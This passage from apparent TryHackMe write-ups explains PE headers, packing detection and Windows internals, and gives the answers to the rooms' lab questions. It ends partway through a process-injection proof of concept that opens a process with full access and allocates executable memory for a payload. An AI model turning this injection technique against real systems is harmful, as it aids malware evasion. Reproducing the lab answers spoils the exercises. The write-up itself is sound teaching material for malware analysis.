</ul> <p>The Signature consists of marking the start of NT_HEADERS.</p> <h3 id="file_header">FILE_HEADER</h3> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/rJy0g9rbC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="FILE_HEADER Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The FILE_HEADER gives some vital information like:</p> <ul> <li><strong>Machine</strong>: Type of architecture the PE file is written. <code class="language-plaintext highlighter-rouge">i386</code> is for 32-bit architecture.</li> <li><strong>NumberOfSections</strong>: A PE file contains section where code, variables and other ressources are stored. It mentions how many the PE file has.</li> <li><strong>TimeDateStamp</strong>: Time and date of binary compilation</li> <li><strong>PointerToSymbolTable and NumberOfSymbols</strong>: Generally not related to PE files and are there due to COFF file headers.</li> <li><strong>SizeOfOptionalHeader</strong>: Size of the optional header</li> <li><strong>Charactristics</strong>: Tells us that the PE file is an executable image, has stripped relocation information, line numbers, and local symbol information.</li> </ul> <p>For characteristics, these means that the executable is not position-independent and must be loaded at a specific base address, the PE file does not contain detailed debugging data and debugging symbols are removed, making it harder to debug or analyze the executable.</p> <p>These are located here in the hex view with the value <code class="language-plaintext highlighter-rouge">0x0f01</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/Sys3NtB-R.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="FILE_HEADER Characteristics Hex location" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions-1">Questions</h3> <p><strong>In the attached VM, there is a file Desktop\Samples\zmsuz3pinwl. Open this file in pe-tree. Is this PE file compiled for a 32-bit machine or a 64-bit machine?</strong></p> <p>According to <em>pe-tree</em>, <code class="language-plaintext highlighter-rouge">Machine 0x014c I386</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">32-bit machine</code></em></p> <p><strong>What is the TimeDateStamp of this file?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x62289d45 Wed Mar 9 12:27:49 2022 UTC</code></em></p> <h2 id="task-5---optional_header">Task 5 - OPTIONAL_HEADER</h2> <p>The OPTIONAL_HEADER is also a part of the NT_HEADERS and contains some of the most important information.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/HJSnl9SZC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="OPTIONAL_HEADER Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The most important fields are:</p> <ul> <li><strong>Magic</strong>: Tells whether the PE file is a 32-bit (<code class="language-plaintext highlighter-rouge">0x010B</code>) or a 64-bit appliaction (<code class="language-plaintext highlighter-rouge">0x020B</code>).</li> <li><strong>AddressOfEntryPoint</strong>: Address where Windows will begin execution. This is an offset relative (RVA - Relative Virtual Address) of the base address contained into ImageBase.</li> <li><strong>BaseOfCode</strong> and <strong>BaseOfData</strong>: Relative addresses of code and data sections.</li> <li><strong>ImageBase</strong>: Preferred loading address of the PE in the memory. Generally, the value is <code class="language-plaintext highlighter-rouge">0x00400000</code> but can sometimes be changed and relative addresses are relocated following the new ImageBase.</li> <li><strong>Subsystem</strong>: Represent a value for Windows Native, GUI, CLI or other ones.</li> <li><strong>DataDirectory</strong>: Contains import and export information of the PE file. These locate the RVA of the needed sections.</li> </ul> <h3 id="questions-2">Questions</h3> <p><strong>Which variable from the OPTIONAL_HEADER indicates whether the file is a 32-bit or a 64-bit application?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Magic</code></em></p> <p><strong>What Magic value indicates that the file is a 64-bit application?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x020B</code></em></p> <p><strong>What is the subsystem of the file Desktop\Samples\zmsuz3pinwl?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x0003 WINDOWS_CUI</code></em></p> <h2 id="task-6---image_section_header">Task 6 - IMAGE_SECTION_HEADER</h2> <p>Sections in a PE file contains data like code, icons, images, GUI elements… and information about these are stored into the IMAGE_SECTION_HEADER.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/SJf5lqHZR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="IMAGE_SECTION_HEADER Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>In this header, we can find different sections named <code class="language-plaintext highlighter-rouge">.text</code>, <code class="language-plaintext highlighter-rouge">.rdata</code>, <code class="language-plaintext highlighter-rouge">.data</code>, <code class="language-plaintext highlighter-rouge">.ndata</code> and <code class="language-plaintext highlighter-rouge">.rsrc</code>.</p> <ul> <li><strong>.text</strong>: Contains the executable code. The Characteristics for this section include <em>CODE</em>, <em>EXECUTE</em> and <em>READ</em>, meaning that this section contains executable code, which can be read but can’t be written to.</li> <li><strong>.data</strong>: Contains initialized data of the application. The Characteristics are <em>READ/WRITE</em>.</li> <li><strong>.rdata/.idata</strong>: Contains import information to import functions or data from other files.</li> <li><strong>.ndata</strong>: Contains uninitialized data.</li> <li><strong>.reloc</strong>: Contains relocation information of the PE.</li> <li><strong>.rsrc</strong>: Contains icons, images or other ressources required for UI.</li> </ul> <p>Into each sections, we can retrieve information like:</p> <ul> <li><strong>VirtualAddress</strong>: Section’s RVA.</li> <li><strong>VirtualSize</strong>: Section’s size once loaded into memory.</li> <li><strong>SizeOfRawData</strong>: Section’s size as stored on the disk before loaded in memory.</li> <li><strong>Characteristics</strong>: Permissions of the section.</li> </ul> <h3 id="questions-3">Questions</h3> <p><strong>How many sections does the file Desktop\Samples\zmsuz3pinwl have?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">7</code></em></p> <p><strong>What are the characteristics of the .rsrc section of the file Desktop\Samples\zmsuz3pinwl</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0xe0000040 INITIALIZED_DATA | EXECUTE | READ | WRITE</code></em></p> <h2 id="task-7---image_import_descriptor">Task 7 - IMAGE_IMPORT_DESCRIPTOR</h2> <p>The IMAGE_IMPORT_DESCRIPTOR structure contains information about the different Windows APIs needed to be loaded when the application in executed.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/Hkpkl5SWA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="IMAGE_IMPORT_DESCRIPTOR pe-tree" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>As we can see, this PE imports functions from <em>ADVAPI32.dll</em>, <em>SHELL32.dll</em>, <em>ole32.dll</em>, <em>COMCTL32.dll</em>, and <em>USER32.dll</em>. <code class="language-plaintext highlighter-rouge">OriginalFirstThunk</code> and <code class="language-plaintext highlighter-rouge">FirstThunk</code> values are used by the OS to build the Import Address Table (IAT) of the PE file.</p> <ul> <li><strong>OriginalFirstThunk</strong> is an array of pointers to IMAGE_THUNK_DATA structures containing references to imported function names or ordinals, used by the OS loader during dynamic linking of a PE file.</li> <li><strong>FirstThunk</strong> is an array of pointers within the Import Descriptor table of a PE file, initially populated with the same values as <code class="language-plaintext highlighter-rouge">OriginalFirstThunk</code> and later updated with resolved function addresses during dynamic linking.</li> <li>The <strong>Import Address Table (IAT)</strong> is a data structure used by the operating system to store the resolved addresses of imported functions from external DLLs, facilitating dynamic linking in a PE file.</li> </ul> <p>By studying imports of the PE file, we can learn a lot about what activities it might perform.</p> <h3 id="questions-4">Questions</h3> <p><strong>The PE file Desktop\Samples\redline imports the function CreateWindowExW. From which dll file does it import this function?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">USER32.dll</code></em></p> <h2 id="task-8---packing-and-identifying-packed-executables">Task 8 - Packing and Identifying packed executables</h2> <p>Because PE file’s information can be easily read, packers obfuscate the data in a PE file in a way that it can’t be read without unpacking it. The unpacking process is ran when the PE file is executed. This is done in order to prevent program’s static reverse engineering.</p> <h3 id="from-section-headers">From Section Headers</h3> <p>In previous task, we have seen that sections are commonly named <code class="language-plaintext highlighter-rouge">.text</code>, <code class="language-plaintext highlighter-rouge">.data</code> and <code class="language-plaintext highlighter-rouge">.rsrc</code>. When looking at the file <em>zmsuz3pinwl</em>, we can see there is some unconventional names.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/ByOwr9BWA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="zmsuz3pinwl Sections" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Using <code class="language-plaintext highlighter-rouge">pecheck</code>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
 entropy: 7.999788 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
 entropy: 7.961048 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
 entropy: 7.554513 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
.rsrc entropy: 6.938747 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
 entropy: 0.000000 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
.data entropy: 7.866646 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
.adata entropy: 0.000000 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
...
<span class="o">[</span>IMAGE_SECTION_HEADER]
0x1F0      0x0   Name:                          
0x1F8      0x8   Misc:                          0x3F4000  
0x1F8      0x8   Misc_PhysicalAddress:          0x3F4000  
0x1F8      0x8   Misc_VirtualSize:              0x3F4000  
0x1FC      0xC   VirtualAddress:                0x1000    
0x200      0x10  SizeOfRawData:                 0xD3400
</code></pre></div></div> <p>When checking the Entropy of <em>.data</em> and three of the four unnamed section, it is high, approaching 8. This means there is a high level in randomness in data and confirms our toughts about this is indicating a packed executable.<br/> Also, these sections has the <em>EXECUTE</em> permissions, which means there is many data parts and the depacking code in one of the sections.</p> <p>Another valuable piece information is that in packed executable, <code class="language-plaintext highlighter-rouge">SizeOfRawData</code> is always smaller than <code class="language-plaintext highlighter-rouge">Misc_VirtualSize</code> because unpacking process makes the section significantly larger.</p> <h3 id="from-import-functions">From Import functions</h3> <p>When looking into import functions, packed executables only imports the libraries needed to unpack the program like <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>…</p> <p>To sum up, a packed executable will always have one of these indications:</p> <ul> <li>Unconventional section names</li> <li>EXECUTE permissions for multiple sections</li> <li>High Entropy, approaching 8, for some sections.</li> <li>A significant difference between SizeOfRawData and Misc_VirtualSize of some PE sections</li> <li>Very few import functions</li> </ul> <h3 id="questions-5">Questions</h3> <p><strong>Which of the files in the attached VM in the directory Desktop\Samples seems to be a packed executable?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">zmsuz3pinwl</code></em></p> <h2 id="task-9---conclusion">Task 9 - Conclusion</h2> <p>This room provided a detailed overview of Portable Executable (PE) file headers, focusing on their role in analyzing Windows executable files. Key topics covered included:</p> <ul> <li>Understanding the structure of PE files and their headers like IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, and others.</li> <li>Learning to interpret critical information stored in these headers, such as machine architecture, compilation timestamp, entry point address, section details, and import libraries.</li> <li>Exploring methods for identifying packed executables through unconventional section names, high entropy values, and minimal import functions.</li> </ul> <p>Using tools like pe-tree and wxHexEditor, analysts can efficiently dissect PE files, spot potential malware indicators, and gain insights into executable behavior. This knowledge is crucial for professionals involved in malware analysis and Windows security.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Static Analysis"/><category term="Windows"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Windows Internals</title><link href="https://nonohm.github.io/blog/2024/THM-Windows-Internals/" rel="alternate" type="text/html" title="THM Windows Internals"/><published>2024-04-21T17:32:42+00:00</published><updated>2024-04-21T17:32:42+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Windows-Internals</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Windows-Internals/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In this room, we will be observing the Windows operating system common internal components. Because Windows machines are making up a majority of corporate infrastructure, it is crucial to understand how it works to aid in evasion and exploitation.</p> <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>Understand and intreact with Windows processes and their underlying technologies.</li> <li>Learn about core file formats and how they are used.</li> <li>Interact with Windows internals and understand how the Windows kernel operates.</li> </ul> <h2 id="task-2---processes">Task 2 - Processes</h2> <p>A process is a representation of the execution of a program and an application can contain one or more processes. It has many components that get broken down in order to be stored and interacted with.</p> <p>A process contains:</p> <table> <thead> <tr> <th style="text-align: center">Process Component</th> <th style="text-align: center">Purpose</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">Private Virtual Address Space</td> <td style="text-align: center">Virtual memory addresses that the process is allocated.</td> </tr> <tr> <td style="text-align: center">Executable Program</td> <td style="text-align: center">Defines code and data stored in the virtual address space.</td> </tr> <tr> <td style="text-align: center">Open Handles</td> <td style="text-align: center">Defines handles to system resources accessible to the process.</td> </tr> <tr> <td style="text-align: center">Security Context</td> <td style="text-align: center">The access token defines the user, security groups, privileges, and other security information.</td> </tr> <tr> <td style="text-align: center">Process ID</td> <td style="text-align: center">Unique numerical identifier of the process.</td> </tr> <tr> <td style="text-align: center">Threads</td> <td style="text-align: center">Section of a process scheduled for execution.</td> </tr> </tbody> </table> <p>Because they are created during the execution of an applicaction, processes are core of Windows functions like Windows Defender (MsMpEng).</p> <p>Attackers can target processes to evade detection and hide malware and legitimate processes with <a href="https://attack.mitre.org/techniques/T1055/">Process Injection</a>, <a href="https://attack.mitre.org/techniques/T1055/012/">Process Hollowing</a>, <a href="https://attack.mitre.org/techniques/T1055/013/">Process Masquerading</a> and so on…</p> <p>Here is what components resides in a Private Virtual Address Space:</p> <table> <thead> <tr> <th style="text-align: center">Component</th> <th style="text-align: center">Purpose</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">Code</td> <td style="text-align: center">Code to be executed by the process.</td> </tr> <tr> <td style="text-align: center">Global Variables</td> <td style="text-align: center">Stored variables.</td> </tr> <tr> <td style="text-align: center">Process Heap</td> <td style="text-align: center">Defines the heap where data is stored.</td> </tr> <tr> <td style="text-align: center">Process Resources</td> <td style="text-align: center">Defines further resources of the process.</td> </tr> <tr> <td style="text-align: center">Environment Block</td> <td style="text-align: center">Data structure to define process information.</td> </tr> <tr> <td style="text-align: center">Threads Memory</td> <td style="text-align: center">Section of a process scheduled for execution.</td> </tr> </tbody> </table> <p>There are tools which allow us to visualize processes like Task Manager or Process Explorer/Procmon from <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/">Sysinternals</a>.</p> <p>Most of time, end-users deal with Name, PID, Status and User parameters.</p> <h3 id="questions">Questions</h3> <p><strong>What is the process ID of “notepad.exe”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">5984</code></em></p> <p><strong>What is the parent process ID of the previous process?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">3412</code></em></p> <p><strong>What is the integrity level of the process?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">High</code></em></p> <h2 id="task-3---threads">Task 3 - Threads</h2> <p>A thread is an executable unit utilized within a process and scheduled based on system-specific factors, including CPU and memory attributes, priority levels, and logical considerations.<br/> Essentially, a thread can be defined as controlling the execution of a process.</p> <p>Threads are commonly abused to aid in code execution by controling thread execution.</p> <p>Threads share the same details and resources as their parent process, such as code, global variables, etc. Threads also have their unique values and data, outlined in the table below.</p> <table> <thead> <tr> <th style="text-align: center">Component</th> <th style="text-align: center">Purpose</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">Stack</td> <td style="text-align: center">All data relevant and specific to the thread (exceptions, procedure calls, etc.)</td> </tr> <tr> <td style="text-align: center">Thread Local Storage</td> <td style="text-align: center">Pointers for allocating storage to a unique data environment</td> </tr> <tr> <td style="text-align: center">Stack Argument</td> <td style="text-align: center">Unique value assigned to each thread</td> </tr> <tr> <td style="text-align: center">Context Structure</td> <td style="text-align: center">Holds machine register values maintained by the kernel</td> </tr> </tbody> </table> <h3 id="questions-1">Questions</h3> <p><strong>What is the thread ID of the first thread created by notepad.exe?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">5908</code></em></p> <p><strong>What is the stack argument of the previous thread?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">6584</code></em></p> <h2 id="task-4---virtual-memory">Task 4 - Virtual Memory</h2> <p>Virtual Memory is crucial component of how processes work and interact with each other. It allows components to interact as if it was physical memory without the risk of collision between applications.</p> <p>Virtual Memory provides a priate virtual address space to each process. A memory manager is used to translate virtual addresses to physical addresses.</p> <p>Memory manager divides the virtual memory space into fixed-size block called pages. Because the RAM is not infinite, Memory manager transfers pages that are not used by the application to the disk and retrives them when needed.</p> <p>On 32-bit system, the maximum VA space is 4 GB and is 256 TB on 64-bit systems. The lower half is allocated to applications and the upper half of memory is allocated for OS memory utilization.</p> <h3 id="questions-2">Questions</h3> <p><strong>What is the total theoretical maximum virtual address space of a 32-bit x86 system?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4 gb</code></em></p> <p><strong>What default setting flag can be used to reallocate user process address space?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">increaseUserVA</code></em></p> <p><strong>What is the base address of “notepad.exe”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x7ff652ec0000</code></em></p> <h2 id="task-5---dynamic-link-libraries">Task 5 - Dynamic Link Libraries</h2> <p>DLLs are libraries that contain code and data that can be used by more than one program at a time. They help:</p> <ul> <li>Promote modularization of code</li> <li>Code reuse</li> <li>More efficient memory usage</li> <li>Reduce disk usage</li> </ul> <p>DLL are assigned as dependencies when loaded in a program. Since programs can be dependent on DLLs, they can be targeted rather than the program itself to control some aspects of the functionality using <a href="https://attack.mitre.org/techniques/T1574/001/">DLL Hijacking</a>, <a href="https://attack.mitre.org/techniques/T1574/002/">DLL Side-loading</a> and <a href="https://attack.mitre.org/techniques/T1055/001/">DLL injection</a>.</p> <p>DLLs are created slightly different than normal programs:</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"stdafx.h"</span><span class="cp">
#define EXPORTING_DLL
#include</span> <span class="cpf">"sampleDLL.h"</span><span class="cp">
</span><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HANDLE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span>
<span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">HelloWorld</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">MessageBox</span><span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Hello World"</span><span class="p">),</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"In a DLL"</span><span class="p">),</span> <span class="n">MB_OK</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>The header file <code class="language-plaintext highlighter-rouge">sampleDLL.h</code> defines what functions are imported and exported:</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#ifndef INDLL_H
</span>    <span class="cp">#define INDLL_H
</span>    <span class="cp">#ifdef EXPORTING_DLL
</span>        <span class="k">extern</span> <span class="nf">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">HelloWorld</span><span class="p">();</span>
    <span class="cp">#else
</span>        <span class="k">extern</span> <span class="nf">__declspec</span><span class="p">(</span><span class="n">dllimport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">HelloWorld</span><span class="p">();</span>
    <span class="cp">#endif
#endif
</span></code></pre></div></div> <p>When loaded using <em>load-time dynamic linking</em>, explicit calls to the DLL functions are made from the application. This type of linking can be achieved only by providing a header (.h) and import library (.lib) file.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"stdafx.h"</span><span class="cp">
#include</span> <span class="cpf">"sampleDLL.h"</span><span class="cp">
</span><span class="kt">int</span> <span class="n">APIENTRY</span> <span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hPrevInstance</span><span class="p">,</span> <span class="n">LPSTR</span> <span class="n">lpCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nCmdShow</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HelloWorld</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>When loaded using <em>run-time dynamic linking</em>, a separate function (<code class="language-plaintext highlighter-rouge">LoadLibrary</code> or <code class="language-plaintext highlighter-rouge">LoadLibraryEx</code>) is used to load the DLL at run time. Once loaded, <code class="language-plaintext highlighter-rouge">GetProcAddress</code> is needed to identify the exported DLL function to call.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="o">*</span><span class="n">DLLPROC</span><span class="p">)</span> <span class="p">(</span><span class="n">LPTSTR</span><span class="p">);</span>
<span class="p">...</span>
<span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">;</span>
<span class="n">DLLPROC</span> <span class="n">HelloWorld</span><span class="p">;</span>
<span class="n">BOOL</span> <span class="n">fFreeDLL</span><span class="p">;</span>

<span class="n">hinstDLL</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"sampleDLL.dll"</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">hinstDLL</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HelloWorld</span> <span class="o">=</span> <span class="p">(</span><span class="n">DLLPROC</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hinstDLL</span><span class="p">,</span> <span class="s">"HelloWorld"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">HelloWorld</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="p">(</span><span class="n">HelloWorld</span><span class="p">);</span>
    <span class="n">fFreeDLL</span> <span class="o">=</span> <span class="n">FreeLibrary</span><span class="p">(</span><span class="n">hinstDLL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <h3 id="questions-3">Questions</h3> <p><strong>What is the base address of “ntdll.dll” loaded from “notepad.exe”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x7ffd0be200000</code></em></p> <p><strong>What is the size of “ntdll.dll” loaded from “notepad.exe”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x1ec000</code></em></p> <p><strong>How many DLLs were loaded by “notepad.exe”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">51</code></em></p> <h2 id="task-6---portable-executable-format">Task 6 - Portable Executable Format</h2> <p>The PE format defines the structure of the information about the executable and stored data.</p> <p>The PE format is a comprehensive structure of executable and object files. The PE (Portable Executable) and COFF (Common Object File Format) files makes up the PE format.</p> <p>PE Data is most commonly seen in a hex dump of an executable file. The PE data is broken up into seven components:</p> <ul> <li><strong>DOS header</strong>: The <code class="language-plaintext highlighter-rouge">MZ</code> DOS header defines the file format as <code class="language-plaintext highlighter-rouge">.exe</code></li> <li><strong>DOS Stub</strong>: A program run by default that prints a compatibility message like <code class="language-plaintext highlighter-rouge">This program cannot be run in DOS mode</code></li> <li><strong>PE File Header</strong>: Provides PE header information of the binary by defining file format, signature, image file header…</li> <li><strong>Image Optional Header</strong>: Provides configuration settings and metadata for a Windows executable’s runtime environment, including memory allocation, entry point, subsystem type, section alignment, import/export data directories, version information, security checks, and loader configuration.</li> <li><strong>Data Dictionnaries</strong>: Points to the image data directory structure and are a part of <em>Image optional Header</em></li> <li><strong>Section Table</strong>: Define the available sections and information in the image such as code, imports and data</li> </ul> <p>Here is a table containing the purpose of the different sections:</p> <table> <thead> <tr> <th style="text-align: center">Section</th> <th style="text-align: center">Purpose</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">.text</td> <td style="text-align: center">Contains executable code and entry point</td> </tr> <tr> <td style="text-align: center">.data</td> <td style="text-align: center">Contains initialized data (strings, variables, etc.)</td> </tr> <tr> <td style="text-align: center">.rdata or .idata</td> <td style="text-align: center">Contains imports (Windows API) and DLLs.</td> </tr> <tr> <td style="text-align: center">.reloc</td> <td style="text-align: center">Contains relocation information</td> </tr> <tr> <td style="text-align: center">.rsrc</td> <td style="text-align: center">Contains application resources (images, etc.)</td> </tr> <tr> <td style="text-align: center">.debug</td> <td style="text-align: center">Contains debug information</td> </tr> </tbody> </table> <h3 id="questions-4">Questions</h3> <p><strong>What PE component prints the message “This program cannot be run in DOS mode”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">DOS Stub</code></em></p> <p><strong>What is the entry point reported by DiE?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">000000014001acd0</code></em></p> <p><strong>What is the value of “NumberOfSections”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0006</code></em></p> <p><strong>What is the virtual address of “.data”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">00024000</code></em></p> <p><strong>What string is located at the offset “0001f99c”?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Microsoft.Notepad</code></em></p> <h2 id="task-7---interacting-with-windows-internals">Task 7 - Interacting with Windows Internals</h2> <p>Interacting with Windows internals is simpler using the Windows API because it provides native functionality to interact with the OS. The API contains the Win32 API and the Win 64 API.</p> <p>Most Windows internals components interacting with physical hardware and memory.</p> <p>The windows kernel controls all programs and processes and bridges software and hardware interactions. Because an application cannot normally interact with the kernel or modify physical hardware, the use of processor modes and access levels are required.</p> <p>A Windows processor has a <em>user</em> and <em>kernel</em> mode and it switched between these depending the requested mode.</p> <p>The switch between these is facilitated by system and API calls and is referred to as the <em>Switching Point</em>.</p> <table> <thead> <tr> <th style="text-align: center">User mode</th> <th style="text-align: center">Kernel Mode</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">No direct hardware access</td> <td style="text-align: center">Direct hardware access</td> </tr> <tr> <td style="text-align: center">Creates a process in a private virtual address space</td> <td style="text-align: center">Ran in a single shared virtual address space</td> </tr> <tr> <td style="text-align: center">Access to “owned memory locations”</td> <td style="text-align: center">Access to entire physical memory</td> </tr> </tbody> </table> <p>This is a flow chart on how a program interact most of the time with hardware.</p> <figure> <picture> <img src="/assets/img/images/thm_windows_internals/S12Sp3zZC.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="Program syscall Flow Chart" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Here is a Proof-Of-Concept on how to interact with memory by creating a message box into a local process.</p> <p>The steps are:</p> <ol> <li>Allocate local process memory for the message box</li> <li>Write/copy the message box to allocated memory</li> <li>Execute the message box from local process memory</li> </ol> <p>At step one, we can use <code class="language-plaintext highlighter-rouge">OpenProcess</code> to obtain the handle of the specified process.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span>
	<span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="c1">// Defines access rights</span>
	<span class="n">FALSE</span><span class="p">,</span> <span class="c1">// Target handle will not be inhereted</span>
	<span class="n">DWORD</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="c1">// Local process supplied by command-line arguments </span>
<span class="p">);</span>
</code></pre></div></div> <p>At step two, we can use <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> to allocate a region of memory with the payload buffer.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">remoteBuffer</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span>
	<span class="n">hProcess</span><span class="p">,</span> <span class="c1">// Opened target process</span>
	<span class="nb">NULL</span><span class="p">,</span> 
	<span class="k">sizeof</span> <span class="n">payload</span><span class="p">,</span> <span class="c1">// Region size of memory allocation</span>
	<span class="p">(</span><span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">),</span> <span class="c1">// Reserves and commits pages</span>
	<span class="n">PAGE_EXECUTE_READWRITE</span> <span class="c1">// Enables execution and read/write access to the commited pages</span>
<span class="p">);</span>
